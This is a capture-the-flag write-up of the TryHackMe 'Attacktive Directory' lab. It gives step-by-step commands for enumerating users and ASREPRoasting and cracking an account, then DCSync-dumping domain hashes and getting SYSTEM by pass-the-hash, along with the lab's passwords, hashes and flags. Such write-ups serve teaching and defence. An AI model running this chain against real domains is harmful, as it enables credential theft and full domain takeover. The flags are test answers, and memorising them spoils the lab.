# Attacktive Directory — TryHackMe Writeup

**Platform:** TryHackMe | **Difficulty:** Medium | **Category:** Active Directory  
**Author:** Abdelilah | **Date:** April 2026

 What is this room about?

Attacktive Directory is a classic Active Directory exploitation room. The goal is simple: start with nothing but an IP address, enumerate the environment, exploit misconfigurations, and end up with full control of the Domain Controller.

No fancy tricks — just the fundamentals of AD pentesting done step by step.

## Step 1 — Scanning the target

First thing I did was run Nmap to see what's running on the machine.

```bash
***nmap -sV -Pn -T4 10.130.166.89
```

The interesting ports were:

- **88** (Kerberos) — confirms this is a Domain Controller
- **389 / 3268** (LDAP) — Active Directory
- **445** (SMB) — file sharing
- **5985** (WinRM) — remote management

From the LDAP banner I got the domain name: **spookysec.local**

> At this point I know I'm dealing with a Windows DC. The Kerberos port (88) is the key — it's what I'll target next.

## Step 2 — Finding valid usernames with Kerbrute

Before trying any attacks, I need valid usernames. Kerbrute lets me test a wordlist against Kerberos without triggering account lockouts.

```bash
kerbrute userenum -d spookysec.local userlist.txt --dc 10.128.160.218
```

Out of 73,000+ usernames tested, 16 came back valid. Two immediately stood out:

- **svc-admin** — service accounts are often misconfigured
- **backup** — backup accounts often have elevated privileges

## Step 3 — ASREPRoasting svc-admin

I noticed `svc-admin` doesn't require Kerberos pre-authentication. This is a common misconfiguration that lets an attacker request an encrypted ticket from the DC *without a password* — and then crack it offline.

```bash
GetNPUsers.py spookysec.local/ -usersfile user.txt -no-pass -dc-ip 10.128.160.218
```

Got a hash for `svc-admin`. I cracked it with Hashcat (mode 18200):

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

**Password found: `management2005`**

## Step 4 — Exploring SMB shares

With valid credentials, I listed the SMB shares:

```bash
smbclient -L //10.128.160.218 -U svc-admin
```

6 shares showed up. The `backup` share was accessible — and inside it, a file called `backup_credentials.txt`.

The file contained a Base64 string. Decoded it:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

**Result: `backup@spookysec.local:backup2517860`**

## Step 5 — Dumping all domain credentials

The `backup` account has DCSync privileges — meaning it can replicate credentials from the Domain Controller just like a legitimate DC would. I used `secretsdump.py` to pull every hash in the domain:

```bash
secretsdump.py spookysec.local/backup@10.128.160.218
```

This dumped NTLM hashes for every user, including:

```
Administrator : 0e0363213e37b94221497260b0bcb4fc
krbtgt        : 0e2eb8158c27bed09861033026be4c21
```

> The `krbtgt` hash is especially dangerous — it can be used to forge Golden Tickets and maintain persistent access to the domain indefinitely.

## Step 6 — Getting SYSTEM via Pass-the-Hash

I don't need to crack the Administrator hash. I can use it directly to authenticate — this is called Pass-the-Hash.

```bash
psexec.py Administrator@10.128.160.218 \
  -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

```
C:\Windows\system32> whoami
nt authority\system
```

Full Domain Controller compromise. ✅

## Flags

```
svc-admin  →  TryHackMe{K3rb3r0s_Pr3_4uth}
backup     →  TryHackMe{B4ckM3UpSc0tty!}
root       →  TryHackMe{4ctiveD1rectoryM4st3r}
```

## The attack path in one line

```
Nmap → Kerbrute → ASREPRoast → Crack hash → SMB enum → 
Base64 creds → DCSync dump → Pass-the-Hash → SYSTEM
```

## What I learned

- Service accounts without pre-auth enabled are an easy win for attackers — always audit them
- Backup accounts are high-value targets because they often have excessive privileges
- Once you have DCSync rights, the domain is yours — all hashes, no exceptions
- Pass-the-Hash is why strong passwords alone aren't enough — hash exposure = full compromise
